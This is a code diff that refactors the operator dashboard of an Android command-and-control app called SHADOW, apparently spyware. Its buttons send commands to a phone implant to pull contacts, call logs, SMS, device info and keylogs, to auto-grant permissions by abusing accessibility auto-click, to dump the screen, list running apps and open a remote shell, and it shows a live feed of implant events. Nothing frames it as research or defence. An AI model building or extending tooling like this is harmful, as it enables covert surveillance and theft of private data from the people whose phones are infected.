@@ -3,9 +3,6 @@ package com.shadow.operator.ui.fleet
 import androidx.compose.foundation.background
 import androidx.compose.foundation.clickable
 import androidx.compose.foundation.layout.*
-import androidx.compose.foundation.lazy.grid.GridCells
-import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
-import androidx.compose.foundation.lazy.grid.items
 import androidx.compose.foundation.rememberScrollState
 import androidx.compose.foundation.shape.RoundedCornerShape
 import androidx.compose.foundation.verticalScroll
@@ -15,333 +12,427 @@ import androidx.compose.material3.*
 import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
+import androidx.compose.ui.draw.clip
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.graphics.vector.ImageVector
+import androidx.compose.ui.platform.LocalClipboardManager
+import androidx.compose.ui.text.AnnotatedString
 import androidx.compose.ui.text.font.FontFamily
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+import com.shadow.operator.data.ClientConfig
+import com.shadow.operator.data.CommandOutcome
+import com.shadow.operator.data.ImplantEvent
 import com.shadow.operator.data.RpcClient
-import com.shadow.operator.ui.theme.*
+import com.shadow.operator.data.TargetStatus
+import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 
-@OptIn(ExperimentalMaterial3Api::class)
+private val BgDark = Color(0xFF0A0E14)
+private val PanelBg = Color(0xFF141A23)
+private val AccentGreen = Color(0xFF3FE07A)
+private val AccentAmber = Color(0xFFF0B429)
+private val AccentRed = Color(0xFFFF5C5C)
+private val AccentPurple = Color(0xFF9D7BFF)
+private val TextDim = Color(0xFF8892A4)
+
+/** One logged line in the operator's activity feed. */
+private data class LogLine(
+    val ts: Long = System.currentTimeMillis(),
+    val kind: Kind,
+    val title: String,
+    val body: String,
+) {
+    enum class Kind { OK, ERR, INFO, EVENT }
+}
+
+private data class ActionData(
+    val label: String,
+    val icon: ImageVector,
+    val color: Color,
+    val command: String,
+)
+
 @Composable
 fun FleetScreen(
-    rpc: RpcClient,
+    config: ClientConfig,
     onImplantSelect: () -> Unit,
     onFileManager: () -> Unit,
-    onModules: () -> Unit
+    onModules: () -> Unit,
+    onTerminal: () -> Unit,
 ) {
-    var status by remember { mutableStateOf<Map<String, Any>?>(null) }
-    var connected by remember { mutableStateOf(false) }
-    var lastHeartbeat by remember { mutableStateOf(0L) }
-    var resultText by remember { mutableStateOf<String?>(null) }
-    var busyAction by remember { mutableStateOf<String?>(null) }
     val scope = rememberCoroutineScope()
+    val rpc = remember(config) { RpcClient(config) }
 
-    // Poll status every 5 seconds
-    LaunchedEffect(Unit) {
+    var status by remember { mutableStateOf(TargetStatus.EMPTY) }
+    var lines by remember { mutableStateOf(listOf<LogLine>()) }
+    var inFlight by remember { mutableStateOf(setOf<String>()) }
+    var liveFeed by remember { mutableStateOf(true) }
+    var lastEventTs by remember { mutableStateOf(0L) }
+    var now by remember { mutableStateOf(System.currentTimeMillis()) }
+    val scroll = rememberScrollState()
+    val clipboard = LocalClipboardManager.current
+
+    fun log(kind: LogLine.Kind, title: String, body: String) {
+        lines = (listOf(LogLine(kind = kind, title = title, body = body)) + lines).take(200)
+    }
+
+    // ---- poll status (and events when live) ----------------------------------
+    LaunchedEffect(config.implantId, liveFeed) {
         while (true) {
-            status = rpc.getStatus()
-            connected = (status?.get("connected") as? Boolean) ?: false
-            lastHeartbeat = (status?.get("lastHeartbeat") as? Long) ?: (status?.get("lastHeartbeat") as? Int)?.toLong() ?: 0L
-            delay(5000)
+            now = System.currentTimeMillis()
+            val s = withContext(Dispatchers.IO) { rpc.getStatus() }
+            status = s
+            if (liveFeed) {
+                val evts: List<ImplantEvent> = withContext(Dispatchers.IO) { rpc.getEvents() }
+                val fresh = evts.filter { it.ts > lastEventTs }
+                if (fresh.isNotEmpty()) {
+                    lastEventTs = fresh.maxOf { it.ts }
+                    // worker returns newest-first already in most cases; keep it stable
+                    val sorted = fresh.sortedBy { it.ts }
+                    lines = (sorted.map {
+                        LogLine(ts = it.ts, kind = LogLine.Kind.EVENT, title = it.tag, body = it.data)
+                    } + lines).take(200)
+                }
+            }
+            delay(if (liveFeed) 3000L else 5000L)
         }
     }
 
-    fun runAction(label: String, command: String, payload: String = "{}") {
-        if (busyAction != null) return
-        busyAction = label
-        resultText = "Executing $label..."
+    fun run(command: String, payload: String = "{}", label: String = command) {
+        if (command in inFlight) return
+        inFlight = inFlight + command
         scope.launch {
-            val result = rpc.execute(command, payload)
-            resultText = result
-            busyAction = null
+            val outcome = withContext(Dispatchers.IO) { rpc.executeDetailed(command, payload) }
+            inFlight = inFlight - command
+            when (outcome) {
+                is CommandOutcome.Ok -> log(LogLine.Kind.OK, label, outcome.output)
+                is CommandOutcome.Failed -> log(LogLine.Kind.ERR, label, outcome.error)
+                is CommandOutcome.Queued -> log(LogLine.Kind.INFO, label, "queued — implant offline")
+                is CommandOutcome.Timeout -> log(LogLine.Kind.ERR, label, "timeout after ${outcome.waitedMs}ms")
+                is CommandOutcome.TransportError -> log(LogLine.Kind.ERR, label, outcome.why)
+            }
         }
     }
 
-    Scaffold(
-        topBar = {
-            TopAppBar(
-                title = {
-                    Row(verticalAlignment = Alignment.CenterVertically) {
-                        Text(
-                            "SHADOW",
-                            color = AccentGreen,
-                            fontFamily = FontFamily.Monospace,
-                            fontWeight = FontWeight.Bold,
-                            fontSize = 22.sp
-                        )
-                        Spacer(Modifier.width(8.dp))
-                        Text(
-                            "C2",
-                            color = TextSecondary,
-                            fontFamily = FontFamily.Monospace,
-                            fontSize = 14.sp
-                        )
-                    }
-                },
-                actions = {
-                    Row(
-                        verticalAlignment = Alignment.CenterVertically,
-                        modifier = Modifier.padding(horizontal = 12.dp)
-                    ) {
-                        Box(
-                            modifier = Modifier
-                                .size(8.dp)
-                                .background(
-                                    if (connected) OnlineGreen else OfflineRed,
-                                    shape = RoundedCornerShape(4.dp)
-                                )
-                        )
-                        Spacer(Modifier.width(6.dp))
-                        Text(
-                            if (connected) "ONLINE" else "OFFLINE",
-                            color = if (connected) OnlineGreen else OfflineRed,
-                            fontFamily = FontFamily.Monospace,
-                            fontSize = 11.sp
-                        )
-                    }
-                },
-                colors = TopAppBarDefaults.topAppBarColors(
-                    containerColor = SurfaceDark,
-                    titleContentColor = TextPrimary
-                )
-            )
-        },
-        containerColor = BgBlack
-    ) { padding ->
-        Column(
-            modifier = Modifier
-                .fillMaxSize()
-                .padding(padding)
-                .verticalScroll(rememberScrollState())
-                .padding(16.dp),
-            verticalArrangement = Arrangement.spacedBy(12.dp)
+    val connected = status.connected
+    val age = status.ageMs(now)
+
+    Column(
+        modifier = Modifier
+            .fillMaxSize()
+            .background(BgDark)
+            .verticalScroll(scroll)
+            .padding(16.dp),
+        verticalArrangement = Arrangement.spacedBy(14.dp)
+    ) {
+        // ---- header ----------------------------------------------------------
+        Row(
+            modifier = Modifier.fillMaxWidth(),
+            horizontalArrangement = Arrangement.SpaceBetween,
+            verticalAlignment = Alignment.CenterVertically
         ) {
-            // Connection status card
-            Card(
-                colors = CardDefaults.cardColors(containerColor = SurfaceElevated),
-                shape = RoundedCornerShape(12.dp)
-            ) {
-                Row(
-                    modifier = Modifier
-                        .fillMaxWidth()
-                        .padding(16.dp),
-                    horizontalArrangement = Arrangement.SpaceBetween,
-                    verticalAlignment = Alignment.CenterVertically
-                ) {
-                    Column {
-                        Text(
-                            "Target Alpha",
-                            color = TextPrimary,
-                            fontFamily = FontFamily.Monospace,
-                            fontWeight = FontWeight.Bold,
-                            fontSize = 18.sp
-                        )
-                        Text(
-                            if (connected) "LIVE" else "DEAD",
-                            color = if (connected) OnlineGreen else OfflineRed,
-                            fontFamily = FontFamily.Monospace,
-                            fontWeight = FontWeight.Bold,
-                            fontSize = 14.sp
-                        )
-                    }
-                    Column(horizontalAlignment = Alignment.End) {
-                        if (lastHeartbeat > 0) {
-                            val secs = (System.currentTimeMillis() - lastHeartbeat) / 1000
-                            Text(
-                                "${secs}s ago",
-                                color = TextSecondary,
-                                fontFamily = FontFamily.Monospace,
-                                fontSize = 11.sp
-                            )
-                        }
-                        Text(
-                            "Pending: ${status?.get("pendingCommands") ?: "--"}",
-                            color = TextSecondary,
-                            fontFamily = FontFamily.Monospace,
-                            fontSize = 11.sp
-                        )
-                    }
-                }
+            Column {
+                Text("SHADOW", color = Color.White, fontWeight = FontWeight.Bold, fontSize = 22.sp)
+                Text("operator console", color = TextDim, fontSize = 11.sp)
             }
-
-            // Terminal (full width)
-            Card(
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .clickable { onImplantSelect() },
-                colors = CardDefaults.cardColors(containerColor = SurfaceDark),
-                shape = RoundedCornerShape(12.dp)
+            Surface(
+                color = if (connected) AccentGreen.copy(alpha = 0.15f) else AccentRed.copy(alpha = 0.15f),
+                shape = RoundedCornerShape(6.dp)
             ) {
                 Row(
-                    modifier = Modifier
-                        .fillMaxWidth()
-                        .padding(16.dp),
-                    verticalAlignment = Alignment.CenterVertically
+                    modifier = Modifier.padding(horizontal = 10.dp, vertical = 5.dp),
+                    verticalAlignment = Alignment.CenterVertically,
+                    horizontalArrangement = Arrangement.spacedBy(6.dp)
                 ) {
-                    Icon(Icons.Default.Terminal, contentDescription = null, tint = AccentGreen, modifier = Modifier.size(24.dp))
-                    Spacer(Modifier.width(12.dp))
+                    Box(
+                        Modifier
+                            .size(7.dp)
+                            .clip(RoundedCornerShape(50))
+                            .background(if (connected) AccentGreen else AccentRed)
+                    )
                     Text(
-                        "Shell Terminal",
-                        color = TextPrimary,
-                        fontFamily = FontFamily.Monospace,
-                        fontSize = 16.sp,
-                        modifier = Modifier.weight(1f)
+                        if (connected) "LIVE" else "DEAD",
+                        color = if (connected) AccentGreen else AccentRed,
+                        fontSize = 11.sp,
+                        fontWeight = FontWeight.Bold
                     )
-                    Icon(Icons.Default.ChevronRight, contentDescription = null, tint = TextSecondary)
                 }
             }
+        }
 
-            // DATA EXTRACTION grid
-            Text(
-                "DATA EXTRACTION",
-                color = TextSecondary,
-                fontFamily = FontFamily.Monospace,
-                fontSize = 11.sp,
-                fontWeight = FontWeight.Bold
-            )
-            LazyVerticalGrid(
-                columns = GridCells.Fixed(3),
-                horizontalArrangement = Arrangement.spacedBy(8.dp),
-                verticalArrangement = Arrangement.spacedBy(8.dp),
-                modifier = Modifier.height(180.dp)
+        // ---- target card -----------------------------------------------------
+        Card(
+            colors = CardDefaults.cardColors(containerColor = PanelBg),
+            modifier = Modifier
+                .fillMaxWidth()
+                .clickable { onImplantSelect() }
+        ) {
+            Column(Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
+                Text("TARGET", color = TextDim, fontSize = 10.sp, fontWeight = FontWeight.Bold)
+                Text(
+                    config.implantId.ifBlank { "(no target selected)" },
+                    color = Color.White,
+                    fontFamily = FontFamily.Monospace,
+                    fontSize = 13.sp
+                )
+                Row(horizontalArrangement = Arrangement.spacedBy(18.dp)) {
+                    Stat("heartbeat", when {
+                        age < 0 -> "never"
+                        age < 60_000 -> "${age / 1000}s"
+                        else -> "${age / 60_000}m"
+                    })
+                    Stat("queued", status.pendingCommands.toString())
+                    Stat("results", status.queuedResults.toString())
+                }
+            }
+        }
+
+        // ---- shell -----------------------------------------------------------
+        Card(
+            colors = CardDefaults.cardColors(containerColor = PanelBg),
+            modifier = Modifier
+                .fillMaxWidth()
+                .clickable { onTerminal() }
+        ) {
+            Row(
+                Modifier.padding(16.dp),
+                verticalAlignment = Alignment.CenterVertically,
+                horizontalArrangement = Arrangement.spacedBy(10.dp)
             ) {
-                items(listOf(
-                    ActionData("Contacts", Icons.Default.Contacts, Color.White, "contacts"),
-                    ActionData("Call Log", Icons.Default.Call, Color.White, "calllog"),
-                    ActionData("SMS", Icons.Default.Message, Color.White, "sms"),
-                    ActionData("Device Info", Icons.Default.Info, AccentBlue, "device_info"),
-                    ActionData("Files", Icons.Default.Folder, AccentAmber, "__files__"),
-                    ActionData("Keylog Today", Icons.Default.Keyboard, AccentRed, "keylog_file"),
-                )) { action ->
-                    ActionButton(
-                        label = action.label,
-                        icon = action.icon,
-                        color = action.color,
-                        busy = busyAction == action.label,
-                        onClick = {
-                            if (action.command == "__files__") onFileManager()
-                            else runAction(action.label, action.command)
-                        }
-                    )
+                Icon(Icons.Default.Terminal, null, tint = AccentGreen)
+                Column {
+                    Text("Terminal", color = Color.White, fontWeight = FontWeight.SemiBold)
+                    Text("interactive shell on implant", color = TextDim, fontSize = 11.sp)
                 }
             }
+        }
 
-            // PERMISSIONS grid
-            Text(
-                "PERMISSIONS (a11y auto-click — no root/Shizuku)",
-                color = TextSecondary,
-                fontFamily = FontFamily.Monospace,
-                fontSize = 11.sp,
-                fontWeight = FontWeight.Bold
-            )
-            LazyVerticalGrid(
-                columns = GridCells.Fixed(3),
-                horizontalArrangement = Arrangement.spacedBy(8.dp),
-                verticalArrangement = Arrangement.spacedBy(8.dp),
-                modifier = Modifier.height(120.dp)
+        // ---- data extraction -------------------------------------------------
+        SectionLabel("DATA EXTRACTION")
+        ActionGrid(
+            actions = listOf(
+                ActionData("Contacts", Icons.Default.Contacts, AccentGreen, "contacts"),
+                ActionData("Call Log", Icons.Default.Call, AccentGreen, "calllog"),
+                ActionData("SMS", Icons.Default.Message, AccentGreen, "sms"),
+                ActionData("Device Info", Icons.Default.PhoneAndroid, AccentAmber, "device_info"),
+                ActionData("Keylog Today", Icons.Default.Keyboard, AccentPurple, "keylog_file"),
+                ActionData("Keylog Files", Icons.Default.Folder, AccentPurple, "keylog_list"),
+            ),
+            inFlight = inFlight,
+            onRun = { a -> run(a.command, "{}", a.label) }
+        )
+
+        // ---- automation / permissions ---------------------------------------
+        SectionLabel("AUTOMATION  ·  no root, no Shizuku")
+        ActionGrid(
+            actions = listOf(
+                ActionData("Auto-Grant All", Icons.Default.Lock, AccentGreen, "autogrant"),
+                ActionData("Check Granted", Icons.Default.CheckCircle, AccentAmber, "perms"),
+                ActionData("Dump Screen", Icons.Default.Visibility, AccentPurple, "screen"),
+                ActionData("Running Apps", Icons.Default.Apps, AccentAmber, "apps"),
+            ),
+            inFlight = inFlight,
+            onRun = { a -> run(a.command, "{}", a.label) }
+        )
+
+        // ---- files / modules -------------------------------------------------
+        SectionLabel("TOOLS")
+        Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+            WideButton("Files", Icons.Default.Folder, AccentAmber, Modifier.weight(1f)) { onFileManager() }
+            WideButton("Modules", Icons.Default.Extension, AccentPurple, Modifier.weight(1f)) { onModules() }
+        }
+
+        // ---- activity feed ---------------------------------------------------
+        Row(
+            Modifier.fillMaxWidth(),
+            horizontalArrangement = Arrangement.SpaceBetween,
+            verticalAlignment = Alignment.CenterVertically
+        ) {
+            SectionLabel("ACTIVITY  ·  ${lines.size}")
+            Row(
+                verticalAlignment = Alignment.CenterVertically,
+                horizontalArrangement = Arrangement.spacedBy(6.dp)
             ) {
-                items(listOf(
-                    ActionData("Auto-Grant All", Icons.Default.Lock, AccentGreen, "autogrant"),
-                    ActionData("Check Granted", Icons.Default.CheckCircle, AccentAmber, "perms"),
-                    ActionData("Dump Screen", Icons.Default.Visibility, AccentPurple, "screen"),
-                    ActionData("Running Apps", Icons.Default.Apps, AccentAmber, "apps"),
-                )) { action ->
-                    ActionButton(
-                        label = action.label,
-                        icon = action.icon,
-                        color = action.color,
-                        busy = busyAction == action.label,
-                        onClick = {
-                            val cmd = action.command
-                            runAction(action.label, cmd, "{}")
-                        }
-                    )
-                }
+                Text("live", color = if (liveFeed) AccentGreen else TextDim, fontSize = 11.sp)
+                Switch(
+                    checked = liveFeed,
+                    onCheckedChange = { liveFeed = it },
+                    modifier = Modifier.height(28.dp)
+                )
             }
+        }
 
-            // Result display
-            if (resultText != null) {
-                Card(
-                    colors = CardDefaults.cardColors(containerColor = SurfaceDark),
-                    shape = RoundedCornerShape(12.dp)
-                ) {
-                    Column(modifier = Modifier.padding(16.dp)) {
-                        Text(
-                            "OUTPUT",
-                            color = AccentGreen,
-                            fontFamily = FontFamily.Monospace,
-                            fontSize = 11.sp,
-                            fontWeight = FontWeight.Bold
-                        )
-                        Spacer(Modifier.height(8.dp))
-                        Text(
-                            resultText ?: "",
-                            color = TextPrimary,
-                            fontFamily = FontFamily.Monospace,
-                            fontSize = 12.sp,
-                            lineHeight = 18.sp,
-                            maxLines = 30,
-                            overflow = androidx.compose.ui.text.style.TextOverflow.Ellipsis
-                        )
+        if (lines.isEmpty()) {
+            Card(colors = CardDefaults.cardColors(containerColor = PanelBg), modifier = Modifier.fillMaxWidth()) {
+                Text(
+                    "no activity yet\nrun a command or enable live feed",
+                    color = TextDim,
+                    fontSize = 12.sp,
+                    modifier = Modifier.padding(16.dp)
+                )
+            }
+        } else {
+            Column(verticalArrangement = Arrangement.spacedBy(6.dp)) {
+                lines.forEach { line ->
+                    LogCard(line) {
+                        clipboard.setText(AnnotatedString(line.body))
+                        log(LogLine.Kind.INFO, "clipboard", "copied ${line.title} (${line.body.length} chars)")
                     }
                 }
             }
         }
+
+        Spacer(Modifier.height(20.dp))
     }
 }
 
-data class ActionData(val label: String, val icon: ImageVector, val color: Color, val command: String)
+@Composable
+private fun SectionLabel(text: String) {
+    Text(text, color = TextDim, fontSize = 10.sp, fontWeight = FontWeight.Bold)
+}
 
 @Composable
-fun ActionButton(label: String, icon: ImageVector, color: Color, busy: Boolean, onClick: () -> Unit) {
+private fun Stat(label: String, value: String) {
+    Column {
+        Text(label, color = TextDim, fontSize = 10.sp)
+        Text(value, color = Color.White, fontSize = 13.sp, fontFamily = FontFamily.Monospace)
+    }
+}
+
+@Composable
+private fun ActionGrid(
+    actions: List<ActionData>,
+    inFlight: Set<String>,
+    onRun: (ActionData) -> Unit,
+) {
+    // Manual 2-column grid. The previous LazyVerticalGrid inside a scrollable
+    // Column nested two vertical scrollers, which mis-measures on long content.
+    actions.chunked(2).forEach { row ->
+        Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+            row.forEach { a ->
+                ActionButton(
+                    label = a.label,
+                    icon = a.icon,
+                    color = a.color,
+                    busy = a.command in inFlight,
+                    modifier = Modifier.weight(1f),
+                ) { onRun(a) }
+            }
+            if (row.size == 1) Spacer(Modifier.weight(1f))
+        }
+        Spacer(Modifier.height(8.dp))
+    }
+}
+
+@Composable
+private fun ActionButton(
+    label: String,
+    icon: ImageVector,
+    color: Color,
+    busy: Boolean,
+    modifier: Modifier = Modifier,
+    onClick: () -> Unit,
+) {
     Card(
-        modifier = Modifier
-            .fillMaxWidth()
-            .aspectRatio(1f)
-            .clickable(onClick = onClick),
-        colors = CardDefaults.cardColors(containerColor = if (busy) AccentGreen.copy(alpha = 0.1f) else SurfaceElevated),
-        shape = RoundedCornerShape(12.dp)
+        colors = CardDefaults.cardColors(containerColor = PanelBg),
+        modifier = modifier.clickable(enabled = !busy) { onClick() }
     ) {
         Column(
-            modifier = Modifier.fillMaxSize(),
+            Modifier
+                .fillMaxWidth()
+                .padding(vertical = 14.dp),
             horizontalAlignment = Alignment.CenterHorizontally,
-            verticalArrangement = Arrangement.Center
+            verticalArrangement = Arrangement.spacedBy(6.dp)
         ) {
             if (busy) {
                 CircularProgressIndicator(
-                    color = color,
                     modifier = Modifier.size(20.dp),
-                    strokeWidth = 2.dp
+                    strokeWidth = 2.dp,
+                    color = color
                 )
             } else {
-                Icon(icon, contentDescription = label, tint = color, modifier = Modifier.size(22.dp))
+                Icon(icon, null, tint = color, modifier = Modifier.size(22.dp))
             }
-            Spacer(Modifier.height(6.dp))
             Text(
                 label,
-                color = if (busy) AccentGreen else TextSecondary,
-                fontFamily = FontFamily.Monospace,
-                fontSize = 10.sp,
-                maxLines = 1
+                color = if (busy) TextDim else Color.White,
+                fontSize = 11.sp,
+                fontWeight = FontWeight.Medium
             )
         }
     }
 }
 
 @Composable
-fun StatRow(label: String, value: String) {
-    Row(
+private fun WideButton(
+    label: String,
+    icon: ImageVector,
+    color: Color,
+    modifier: Modifier = Modifier,
+    onClick: () -> Unit,
+) {
+    Card(
+        colors = CardDefaults.cardColors(containerColor = PanelBg),
+        modifier = modifier.clickable { onClick() }
+    ) {
+        Row(
+            Modifier
+                .fillMaxWidth()
+                .padding(vertical = 14.dp),
+            horizontalArrangement = Arrangement.Center,
+            verticalAlignment = Alignment.CenterVertically
+        ) {
+            Icon(icon, null, tint = color, modifier = Modifier.size(18.dp))
+            Spacer(Modifier.width(8.dp))
+            Text(label, color = Color.White, fontSize = 12.sp)
+        }
+    }
+}
+
+private val tsFmt = SimpleDateFormat("HH:mm:ss", Locale.US)
+
+@Composable
+private fun LogCard(line: LogLine, onCopy: () -> Unit) {
+    val accent = when (line.kind) {
+        LogLine.Kind.OK -> AccentGreen
+        LogLine.Kind.ERR -> AccentRed
+        LogLine.Kind.INFO -> AccentAmber
+        LogLine.Kind.EVENT -> AccentPurple
+    }
+    Card(
+        colors = CardDefaults.cardColors(containerColor = PanelBg),
         modifier = Modifier
             .fillMaxWidth()
-            .padding(vertical = 2.dp),
-        horizontalArrangement = Arrangement.SpaceBetween
+            .clickable { onCopy() }
     ) {
-        Text(label, color = TextSecondary, fontFamily = FontFamily.Monospace, fontSize = 12.sp)
-        Text(value, color = TextPrimary, fontFamily = FontFamily.Monospace, fontSize = 12.sp)
+        Column(Modifier.padding(10.dp), verticalArrangement = Arrangement.spacedBy(4.dp)) {
+            Row(
+                Modifier.fillMaxWidth(),
+                horizontalArrangement = Arrangement.SpaceBetween
+            ) {
+                Text(
+                    line.title,
+                    color = accent,
+                    fontSize = 10.sp,
+                    fontWeight = FontWeight.Bold,
+                    fontFamily = FontFamily.Monospace
+                )
+                Text(tsFmt.format(Date(line.ts)), color = TextDim, fontSize = 10.sp)
+            }
+            Text(
+                line.body,
+                color = Color.White.copy(alpha = 0.9f),
+                fontSize = 11.sp,
+                fontFamily = FontFamily.Monospace,
+                lineHeight = 15.sp
+            )
+        }
     }
 }
